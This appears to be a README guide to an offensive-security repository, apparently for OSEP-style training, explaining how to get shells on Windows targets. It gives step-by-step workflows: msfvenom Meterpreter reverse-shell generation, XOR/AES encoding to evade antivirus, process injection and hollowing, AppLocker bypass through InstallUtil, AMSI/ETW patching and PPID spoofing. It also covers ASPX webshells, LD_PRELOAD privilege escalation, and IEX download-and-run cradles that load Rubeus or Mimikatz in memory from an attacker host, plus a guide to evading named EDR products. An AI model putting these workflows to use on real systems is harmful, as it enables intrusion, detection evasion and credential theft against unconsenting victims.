# How It All Works — ELI5 Reference Guide

> No jargon. Plain English explanation of every tool and technique in this repo, with exact workflows for each.

---

## The Big Picture (Read This First)

Getting a shell on a Windows target is a 4-layer problem:

```
LAYER 1: Shellcode      — the thing that connects back to you (payload)
LAYER 2: Encoding       — disguise it so AV doesn't recognize the bytes
LAYER 3: Loader         — get it into memory and run it
LAYER 4: Delivery       — bypass whatever is blocking the loader from running
```

Every tool in this repo solves one or more of these layers. Once you understand which layer a tool operates on, everything else clicks.

---

## LAYER 1: Shellcode (the Payload)

### What is shellcode?

It's a tiny blob of machine code — raw bytes — that does ONE job when executed: open a network connection back to your Kali machine and give you a shell (Meterpreter, reverse shell, etc.).

```bash
# Generate it — this is almost always your starting point:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.X LPORT=4444 -f raw -o shell.bin

# For C# files (bake the bytes directly in):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.X LPORT=4444 -f csharp
```

**The problem:** AV vendors have seen Meterpreter shellcode billions of times. The raw bytes are instantly flagged. You MUST encode or encrypt it before putting it in a loader.

---

## LAYER 2: Encoding & Encryption

### XOR Encoding (Lightweight)

**What it does:** Flips each byte using a key. The AV sees garbage. The loader reverses the flip at runtime.

```
raw byte: 0xFC  →  XOR with 0xFA  →  encoded: 0x06
loader:   0x06  →  XOR with 0xFA  →  restored: 0xFC
```

**When to use:** Basic AV (Windows Defender on default settings). Fast, no key management needed.

**Tools:**
- `payloads/encoders/shellcode_encoder.py` — Python XOR encoder, outputs C# format
- `loaders/advanced-runners/Adv_Xor.cs` — C# tool, adds 2 to each byte (simple XOR variant)
- `payloads/encoders/xor-encoder/` — C# XOR encoder tool (Visual Studio project)

**Workflow:**
```bash
# Option A: Python encoder
python3 payloads/encoders/shellcode_encoder.py shell.bin MYKEY xor -cs
# → outputs encrypted C# byte array, paste into your runner

# Option B: Adv_Xor workflow (see Advanced Runners section below)
```

---

### AES Encryption (Strong)

**What it does:** Actually encrypts the shellcode with a 256-bit key + IV. The AV sees random noise. The loader decrypts at runtime using the hardcoded key.

**When to use:** When XOR isn't enough — Defender with cloud protection, CrowdStrike basic rules.

**Tools:**
- `payloads/encoders/shellcode_encoder.py` — same tool, use `aes` flag instead of `xor`
- `loaders/disk-based/clrunner/clrunner.cs` — AES-encrypted loader (see Loader section)

**The IP/Port Placeholder Trick (Critical):**

The `cl*` loaders (clrunner, clinject, clhollow) have a clever trick. Instead of hardcoding your IP, the encrypted shellcode uses placeholder bytes:
- `11-11-11-11` in the shellcode = your actual LHOST will replace this at compile time
- `22-22` = your actual LPORT

This means you compile ONE binary and it works for any IP/port by patching the bytes — or you just generate fresh shellcode with your real IP before encrypting.

**Workflow:**
```bash
# 1. Generate shellcode with your real IP:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.X LPORT=443 -f raw -o shell.bin

# 2. Encrypt it:
python3 payloads/encoders/shellcode_encoder.py shell.bin MYAESKEY aes -cs

# 3. Paste the output into clrunner.cs (replace the buf[] array)

# 4. Compile (Visual Studio on Windows dev box):
#    File → New → Console App (.NET Framework), name "payload", .NET Framework 4.8
#    Paste clrunner.cs, Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
#    Build → Build Solution → output: bin\x64\Debug\payload.exe
#    (Alt: csc.exe /unsafe /platform:x64 /out:payload.exe clrunner.cs)
```

---

### IPv4 Obfuscation (Signature Bypass)

**What it does:** Represents each 4-byte chunk of shellcode as an IPv4 address string like `"252.72.131.228"`. No byte literals in the binary — just strings. Uses a Windows OS function to decode.

**When to use:** When byte pattern detection is the problem but behavioral detection isn't. Good for web shell delivery, macros.

**Workflow:** See `03-loaders/ipv4-obfuscation/README.md`

---

## LAYER 3: Loaders

This is where things get confusing. Here's every loader explained in plain English.

---

### Simple Runner (`03-loaders/shellcode-runners/simple-runner.cs`)

**What it does:**
1. Allocates a chunk of memory with Execute permissions (RWX — read/write/execute)
2. Copies the shellcode into that memory
3. Creates a thread that starts executing from the start of that memory

**Analogy:** You rent a room (memory), move your stuff in (shellcode), and start living there (execute).

**When to use:** Testing that your shellcode works. No AV. CTF boxes. The very first thing you try.

**Doesn't bypass:** Anything. AV will catch the shellcode. EDR will catch the memory allocation pattern.

```
Workflow:
msfvenom → raw shellcode → paste bytes into simple-runner.cs → compile → run
```

---

### Advanced Runner — Adv_Xor.cs + Adv_Runner.cs

**This is what you were asking about.** Two files that work together as a pair:

**Adv_Xor.cs (the encoder):**
- You paste raw shellcode bytes into it
- It adds 2 to each byte (simple encoding)
- It prints the encoded bytes as a C# byte array
- You copy that output into Adv_Runner.cs

**Adv_Runner.cs (the runner):**
- Contains the encoded bytes (with 2 added to each byte)
- At runtime: subtracts 2 from each byte to decode the shellcode back
- Has TWO sandbox checks before decoding:
  1. Sleep for 2 seconds, then check if the clock actually moved — sandboxes fake Sleep() so they can analyze code fast
  2. Calls `VirtualAllocExNuma` — a function that sandboxes often don't emulate, returns null in sandboxes
- Hides the console window (`ShowWindow(SW_HIDE)`)
- Then: VirtualAlloc → copy decoded shellcode → CreateThread → wait

**Workflow:**
```
1. Get raw shellcode bytes (csharp format from msfvenom)
2. Paste bytes into Adv_Xor.cs, compile and run it
   → It prints encoded bytes
3. Copy encoded bytes into Adv_Runner.cs (replace buf[])
4. Compile Adv_Runner.cs and run on target
```

**When to use:** Basic Defender. The encoding bypasses static signature. Sandbox checks help avoid automated analysis.

---

### Process Injection (`03-loaders/process-injection/`)

**What it does:**
1. Opens a handle to an already-running process (like `explorer.exe` or `spoolsv.exe`)
2. Allocates memory INSIDE that process (remote allocation)
3. Writes shellcode into that memory
4. Creates a thread inside that process to run the shellcode

**Why this is better than simple-runner:** The shellcode runs inside a legitimate Windows process. When Defender sees suspicious activity, it sees `explorer.exe` doing it — not your unknown binary.

**Two files:**
- `basic-injection.cs` — finds explorer.exe, injects with XOR-encoded shellcode (key 0xfa)
- `clinject.cs` — same thing but wrapped in InstallUtil (AppLocker bypass, see below)

**Workflow:**
```
1. msfvenom -f csharp → get shellcode bytes
2. Encode with XOR (0xfa key):
   python3 shellcode_encoder.py shell.bin mykey xor -cs
3. Paste encoded bytes into basic-injection.cs
4. Compile (Visual Studio on Windows dev box):
   File → New → Console App (.NET Framework), name "inject", .NET Framework 4.8
   Paste basic-injection.cs, Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
   Build → Build Solution → bin\x64\Debug\inject.exe
   (Alt: csc.exe /unsafe /platform:x64 /out:inject.exe basic-injection.cs)
5. Run: inject.exe [target-process-name]
   (if no arg → auto-selects spoolsv.exe if admin, explorer.exe if not)
```

---

### Process Hollowing (`03-loaders/process-hollowing/`)

**What it does:**
1. Creates a NEW process in a suspended state (like `svchost.exe`) — paused before it does anything
2. Reads the PE (executable) format of that process to find where code lives
3. OVERWRITES the code section with your shellcode
4. Resumes the process

**Why this matters:** In Task Manager and security tools, you see `svchost.exe` running — not a mystery binary. The process was legitimately created by Windows; it just runs YOUR code instead.

**Two files:**
- `hollow.cs` — basic version
- `clhollow.cs` — InstallUtil bypass + PPID spoofing (see below)

**Workflow:**
```
1. msfvenom -f csharp → shellcode
2. Encrypt with AES (use shellcode_encoder.py)
3. Paste encrypted bytes into hollow.cs (replace buf[])
4. Compile (Visual Studio on Windows dev box):
   File → New → Console App (.NET Framework), name "hollow", .NET Framework 4.8
   Paste hollow.cs, Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
   Build → Build Solution → bin\x64\Debug\hollow.exe
   (Alt: csc.exe /unsafe /platform:x64 /out:hollow.exe hollow.cs)
5. Run → spawns svchost.exe, hollows it, shellcode executes as svchost
```

---

### Sections Injection (`03-loaders/sections-injection/sections-runner.cs`)

**What it does:** A more advanced injection technique that avoids the suspicious API calls (`VirtualAllocEx`, `WriteProcessMemory`) that EDR hooks specifically look for.

Instead:
1. Creates a "shared memory section" (like shared memory between processes)
2. Maps that section into BOTH your process AND the target process
3. Writes shellcode into your copy (which appears in both)
4. Triggers execution in the target process via APC or thread creation

**Why this is better:** EDR vendors specifically monitor `VirtualAllocEx` + `WriteProcessMemory` combinations. This bypasses those hooks entirely.

**When to use:** When basic injection is getting caught. Step up from process injection.

---

### DLL Runner (`03-loaders/dll-runners/`)

**Three files that form a chain:**

**DLL_Xor.cs (encoder):**
- Same as Adv_Xor but outputs code for a DLL instead of EXE

**DLL_Runner.cs (the actual DLL):**
- Compiled as a `.dll` (Class Library) not an `.exe`
- Has ONE exported function: `ClassLibrary1.Class1.runner()` — the namespace matters
- When called, it decodes XOR shellcode and runs it

**DLL_Loader.ps1 (the PowerShell delivery):**
- Downloads the DLL from a URL (your Kali web server)
- Loads it entirely in memory via `Assembly.Load()` — no file on disk
- Calls the runner function

**Why a DLL instead of EXE?**
- DLLs can be loaded by PowerShell without writing to disk
- The DLL itself isn't "run" — it's loaded as a library, which looks more legitimate
- Harder for endpoint solutions to block than a direct EXE execution

**Workflow:**
```
1. msfvenom -f csharp → shellcode
2. XOR encode it
3. Paste into DLL_Runner.cs
4. Compile as a DLL (Visual Studio on Windows dev box):
   File → New → Class Library (.NET Framework) — NOT .NET Core
   Project name MUST be "ClassLibrary1" (loader calls this exact name)
   .NET Framework 4.8, Platform target: x64, ☑ Allow unsafe code
   Build → Build Solution → bin\x64\Debug\ClassLibrary1.dll
   (Alt: csc.exe /unsafe /platform:x64 /target:library /out:runner.dll DLL_Runner.cs)
5. Host ClassLibrary1.dll on your Kali web server
6. From PowerShell on target:
   IEX (New-Object Net.WebClient).DownloadString('http://KALI/DLL_Loader.ps1')
   # The loader script downloads and executes the DLL in memory
```

**Critical:** The namespace/class path in DLL_Loader.ps1 must match what's in DLL_Runner.cs: `ClassLibrary1.Class1.runner()`

---

### Reflective Loading (`03-loaders/reflective/`)

**What it does:** Loads entire .NET tools (Rubeus, SharpHound, Mimikatz, custom C# tools) directly into memory from a URL or encrypted file — no file ever touches disk.

**Three tools:**

**Load-Assembly.ps1 (simple version):**
- Downloads a .NET EXE as bytes
- `[System.Reflection.Assembly]::Load($bytes)` — .NET loads it entirely in RAM
- Calls the entry point

**Invoke-SharpEncrypt.ps1 (the encryptor):**
- Takes your compiled .NET EXE
- AES encrypts it + GZip compresses it + Base64 encodes it
- Saves a `.enc` file — this is what you host on your web server
- The decryption key is NOT in the file — you provide it at runtime

**Invoke-SharpLoader.ps1 (the production loader — use this one):**
- Patches AMSI first (built-in bypass)
- Patches ETW (blocks telemetry)
- Downloads the `.enc` file from URL OR loads from disk
- Decrypts (AES) + decompresses (GZip) + Base64 decodes in memory
- `Assembly.Load()` the result
- Calls the entry point with any arguments you pass

**Workflow — Loading Rubeus in memory:**
```powershell
# Step 1: Encrypt Rubeus.exe (run on your Kali):
. .\Invoke-SharpEncrypt.ps1
Invoke-SharpEncrypt -File .\Rubeus.exe -Password "MySuperKey" -OutFile rubeus.enc

# Step 2: Host on web server
python3 -m http.server 80

# Step 3: Load on target (run in PowerShell on Windows):
IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpLoader.ps1')
Invoke-SharpLoader -location http://KALI/rubeus.enc -password "MySuperKey" -argument "kerberoast"
# → Runs Rubeus kerberoast entirely in RAM, no files on disk
```

**When to use:** Loading tools that are too large or too flagged to run directly (Mimikatz, Rubeus, BloodHound).

---

### D/Invoke (`03-loaders/d-invoke/`)

**The problem it solves:** EDRs (CrowdStrike, SentinelOne) put hooks inside `ntdll.dll` — the core Windows library. When your code calls `VirtualAlloc`, the EDR intercepts it and inspects what you're doing. These hooks live in the IAT (Import Address Table) — a list at the start of every EXE that says "I need these Windows functions."

**What D/Invoke does:**
- Doesn't put `VirtualAlloc` in the IAT at all (no suspicious imports visible in static analysis)
- Instead, at runtime, it manually finds the function by walking the Windows process structure (PEB)
- Calls it directly, bypassing the EDR hook

**Analogy:** Instead of calling the receptionist (EDR hook) and asking to speak to VirtualAlloc, you walk directly to VirtualAlloc's desk without going through reception.

**Four project variants:**
- `exe/` — Standalone EXE loader with D/Invoke
- `dll/` — DLL version (reflective load)
- `service/` — Windows Service (persistence)
- `test/` — For testing if D/Invoke resolution works

**Workflow:**
```
1. Open D_invoke.sln in Visual Studio
2. Edit the Template.cs file — paste your encoded shellcode
3. Build the project
4. The built binary resolves all Windows APIs at runtime, bypassing IAT hooks
```

**When to use:** When you're up against EDR (CrowdStrike, SentinelOne, Defender for Endpoint). This is your step up from basic loaders.

---

## LAYER 4: Delivery & Evasion

These solve the problem of "how do I even get my loader to run when something is blocking execution?"

---

### InstallUtil Bypass — cl* Loaders (`clrunner`, `clinject`, `clhollow`)

**The problem:** AppLocker blocks unsigned executables from running. Your `payload.exe` is blocked.

**What InstallUtil is:** A legitimate Microsoft tool (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`) that's whitelisted by AppLocker. It runs custom "install" code inside .NET assemblies.

**The trick:** The `cl*` loaders have a special `[RunInstaller(true)]` attribute and `Uninstall()` method. When InstallUtil's `/U` flag is passed, it calls `Uninstall()` — which is where we put the shellcode execution.

```
cmd.exe → blocked (AppLocker)
InstallUtil.exe → whitelisted → runs clrunner.Uninstall() → shellcode executes
```

**Command:**
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clrunner.exe
```

**The three cl* variants:**
| File | What it does | Extra features |
|------|-------------|----------------|
| `clrunner.cs` | AES shellcode runner via InstallUtil | Sandbox checks |
| `clinject.cs` | AES shellcode injector via InstallUtil | Injects into target process |
| `clhollow.cs` | AES process hollowing via InstallUtil | PPID spoofing + hollowing |

**Workflow for clrunner:**
```
1. Generate shellcode: msfvenom -f raw -o shell.bin
2. Encrypt: python3 shellcode_encoder.py shell.bin MYKEY aes -cs
3. Paste encrypted bytes into clrunner.cs buf[] array
4. Compile (Visual Studio on Windows dev box):
   File → New → Console App (.NET Framework), name "payload", .NET Framework 4.8
   Paste clrunner.cs, Project → Properties → Build → Platform target: x64, ☑ Allow unsafe code
   Build → Build Solution → bin\x64\Debug\payload.exe
   (Alt: csc.exe /unsafe /platform:x64 /out:payload.exe clrunner.cs)
5. Drop payload.exe on target (via webshell, etc.)
6. Execute:
   InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

---

### PPID Spoofing (`03-loaders/ppid-spoof/PPIDSpoofDropper.cs`)

**The problem:** Security tools look at process trees. If PowerShell spawns from your payload.exe → suspicious. If PowerShell spawns from notepad.exe → normal user activity.

**What it does:**
1. Finds or creates a `notepad.exe` process
2. Uses Windows API (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) to tell Windows "spawn the new process as a child of notepad, not me"
3. Spawns a hidden PowerShell process that runs your encoded command

**Visual difference:**
```
WITHOUT PPID spoof:      payload.exe → powershell.exe  (suspicious!)
WITH PPID spoof:         notepad.exe → powershell.exe  (normal)
```

**Workflow:**
```
1. Base64 encode your PowerShell payload:
   python3 -c "import base64; print(base64.b64encode('IEX(...your PS code...)'.encode('utf-16le')).decode())"
2. Either paste into PPIDSpoofDropper.cs hardcoded, OR pass at runtime:
   PPIDSpoofDropper.exe <your-base64>
```

**Note:** No built-in AppLocker bypass. Combine with clhollow for the full package.

---

### Webshells (`03-loaders/webshells/`)

**What they are:** ASPX pages deployed on IIS web servers that give you command execution or direct shellcode injection via HTTP requests.

**ASPX_Runner64.aspx:**
- Receives shellcode via HTTP request (or has it baked in)
- Allocates memory and runs it in the w3wp.exe (IIS worker) process

**ASPX_Inject64.aspx:**
- Injects shellcode into the `w3wp.exe` process running IIS
- The shell appears to come from the web server process

**When to use:** You compromised a web server (uploaded the .aspx via upload vulnerability, LFI, etc.) and want execution. The webshell acts as your loader.

**Workflow:**
```
1. Customize: update RHOST, RPORT in the .aspx file + paste your shellcode
2. Upload to target IIS server (via upload vuln, webdav, etc.)
3. Request the .aspx page → shellcode executes on server → Meterpreter connects back
```

---

### Linux Loaders (`03-loaders/linux/`)

**When to use:** You compromised a Linux target and need to run shellcode (rare in OSEP — Linux usually means lateral movement prep, not shellcode).

**simpleLoader.c:**
- Allocates memory with `mmap(PROT_EXEC)`
- Copies XOR-encoded shellcode, decodes it, executes

**sharedLibrary_LD_PRELOAD.c and sharedLibrary_LD_LIBRARY_PATH.c:**
- Compiled as a shared library (`.so` file)
- When the OS loads a program, it loads this library too
- Intercepts `geteuid()` → forks a new process → runs shellcode in the background
- Use for privilege escalation: if a SUID binary calls `geteuid()`, our library intercepts that call

**Workflow (LD_PRELOAD privesc):**
```bash
# 1. Encode your shellcode:
gcc -o encoder simpleXORencoder.c && ./encoder
# → copies encoded bytes to clipboard/stdout

# 2. Paste encoded bytes into sharedLibrary_LD_PRELOAD.c
# 3. Compile as shared lib:
gcc -shared -fPIC -o evil.so sharedLibrary_LD_PRELOAD.c -z execstack

# 4. Set LD_PRELOAD to your lib before running a SUID binary:
LD_PRELOAD=/tmp/evil.so /usr/bin/some-suid-binary
# → geteuid() is intercepted → shellcode forks and executes as root
```

---

## DECISION GUIDE: Which Loader Do I Use?

```
Start here: What defense are you up against?

NO AV / basic AV:
    → simple-runner.cs (fastest, most reliable)
    → just encode with XOR first

AMSI blocking PS scripts:
    → AMSI bypass first (01-evasion/amsi-bypass/)
    → THEN load Invoke-SharpLoader or DLL_Loader from memory

AppLocker blocking EXEs:
    → InstallUtil bypass: clrunner.exe
    → OR: PowerShell reflective load (no EXE needed)

Defender catching the shellcode signature:
    → AES encrypt it: shellcode_encoder.py
    → Use clrunner (built-in AES decrypt)
    → OR: IPv4 obfuscation (03-loaders/ipv4-obfuscation/)

Defender catching your loader (behavioral):
    → Add sandbox checks (Sleep timer + VirtualAllocExNuma)
    → PPID spoof to hide process tree
    → Inject into existing process instead of running standalone
    → Process hollowing (shellcode runs inside svchost.exe)

EDR (CrowdStrike, SentinelOne, Defender for Endpoint):
    → D/Invoke: bypasses IAT hooks
    → Sections injection: bypasses VirtualAllocEx hooks
    → ETW patch + AMSI patch first (blind the telemetry)
    → Indirect syscalls (advanced — see Tasks 3/11/13)

Want to load a tool (Rubeus, Mimikatz) without disk:
    → Invoke-SharpLoader (AES encrypt tool → load from URL)
    → Assembly.Load() pattern (see 06-credentials/rubeus-loading.md)
```

---

## Payload Encoders Reference

| Tool | Location | What it does | Output |
|------|----------|-------------|--------|
| `shellcode_encoder.py` | `payloads/encoders/` | XOR or AES encrypt raw shellcode | C#, C++, Python byte array |
| `Adv_Xor.cs` | `loaders/advanced-runners/` | Adds 2 to each byte (simple XOR) | C# byte array for Adv_Runner |
| `DLL_Xor.cs` | `loaders/advanced-runners/DLL_Runner/` | Same, for DLL runner | C# byte array for DLL_Runner |
| `xor-encoder/` | `payloads/encoders/` | C# XOR encoder tool (VS project) | Encoded byte array |
| `rot-encoder/` | `payloads/encoders/` | ROT cipher variant | Encoded byte array |
| `donut.py` | `payloads/donut/` | Converts ANY PE (EXE/DLL) to shellcode | Raw shellcode .bin |
| IPv4 Python script | `03-loaders/ipv4-obfuscation/` | Bytes as IP strings | C# string array |

**Usage example — shellcode_encoder.py:**
```bash
# XOR encrypt (fast, basic):
python3 shellcode_encoder.py shell.bin MYXORKEY xor -cs

# AES encrypt (strong):
python3 shellcode_encoder.py shell.bin MYAESKEY aes -cs
# → writes result to ./result/encryptedShellcodeWrapper.cs
# → paste this file's shellcode into your loader template
```

**Donut — convert EXE to shellcode:**
```bash
# Takes any PE file and makes raw shellcode you can inject:
python3 donut.py -f Mimikatz.exe -o mimikatz_shellcode.bin
# Now inject mimikatz_shellcode.bin with ANY of the injection loaders above
```

---

## Quick Ops Summary — What to Do On Each Scenario

### "I have a webshell and want Meterpreter"
```
1. Upload ASPX_Inject64.aspx (customize RHOST/RPORT first)
2. Start MSF listener
3. Hit the .aspx URL → shell connects back
```

### "I'm in a PowerShell session and want a C# tool in memory"
```
1. Encrypt the tool: Invoke-SharpEncrypt -File Tool.exe -Password "key" -OutFile tool.enc
2. Host on Kali: python3 -m http.server 80
3. Load on target:
   IEX (New-Object Net.WebClient).DownloadString('http://KALI/Invoke-SharpLoader.ps1')
   Invoke-SharpLoader -location http://KALI/tool.enc -password "key" -argument "args"
```

### "AppLocker is blocking my EXE"
```
1. Use clrunner.cs (InstallUtil bypass)
2. Or: use PowerShell reflective loading (no EXE needed at all)
3. Or: DLL_Loader.ps1 (loads DLL from URL, no EXE)
```

### "Defender is catching my payload"
```
1. Encrypt shellcode: python3 shellcode_encoder.py shell.bin KEY aes -cs
2. Use clrunner (has AES decrypt built in)
3. Add ETW patch + AMSI bypass before execution
4. If still catching: switch to D/Invoke loader
```

### "I need to run Mimikatz but it's flagged"
```
See: 06-credentials/mimikatz-loader.md
Short version: Invoke-SharpLoader with encrypted mimikatz.exe
Or: reflective load Mimikatz.dll via powerkatz
```

---

## Files Quick Reference

```
loaders/
├── disk-based/
│   ├── clrunner/clrunner.cs      ← AES runner, AppLocker bypass via InstallUtil
│   ├── clinject/clinject.cs      ← AES injector, AppLocker bypass
│   └── clhollow/clhollow.cs      ← AES hollower, AppLocker bypass + PPID spoof
├── advanced-runners/
│   ├── Adv_Xor.cs                ← Encode shellcode (adds 2 to each byte)
│   └── Adv_Runner.cs             ← Run encoded shellcode (sandbox checks + decode)
├── process-hollowing/Program.cs  ← Create suspended svchost, overwrite with shellcode
├── process-injector/Program.cs   ← Inject into explorer.exe/spoolsv.exe
├── assembly-loader/
│   ├── DLL_Xor.cs                ← Encode shellcode for DLL
│   ├── DLL_Runner.cs             ← Shellcode runner compiled as DLL
│   └── DLL_Loader.ps1            ← PS: download DLL from URL, load in memory
├── ppid-spoof-dropper/
│   └── PPIDSpoofDropper.cs       ← Spawn PS as child of notepad.exe
├── d-invoke/                     ← Full D/Invoke framework (bypasses EDR IAT hooks)
└── webshells/
    ├── ASPX_Runner64.aspx        ← Run shellcode via IIS webshell
    └── ASPX_Inject64.aspx        ← Inject into w3wp.exe via IIS webshell

03-loaders/  (curated, documented versions of the above)
├── RUNBOOK.md                    ← Which loader for which scenario
├── shellcode-runners/            ← simple-runner, clrunner
├── process-injection/            ← basic-injection, clinject
├── process-hollowing/            ← hollow, clhollow
├── dll-runners/                  ← DLL_Xor, DLL_Runner, DLL_Loader
├── reflective/                   ← Invoke-SharpLoader, Invoke-SharpEncrypt
├── d-invoke/                     ← D/Invoke framework
├── ppid-spoof/                   ← PPIDSpoofDropper
├── sections-injection/           ← sections-runner (NtCreateSection)
├── ipv4-obfuscation/             ← IPv4 shellcode encoding
├── linux/                        ← simpleLoader, LD_PRELOAD
└── webshells/                    ← ASPX shells

payloads/
├── encoders/shellcode_encoder.py ← Main encoder: XOR or AES, output C#/C++/Python
├── encoders/osepacker.py         ← Custom packer
└── donut/donut.py                ← Convert EXE/DLL to raw shellcode
```
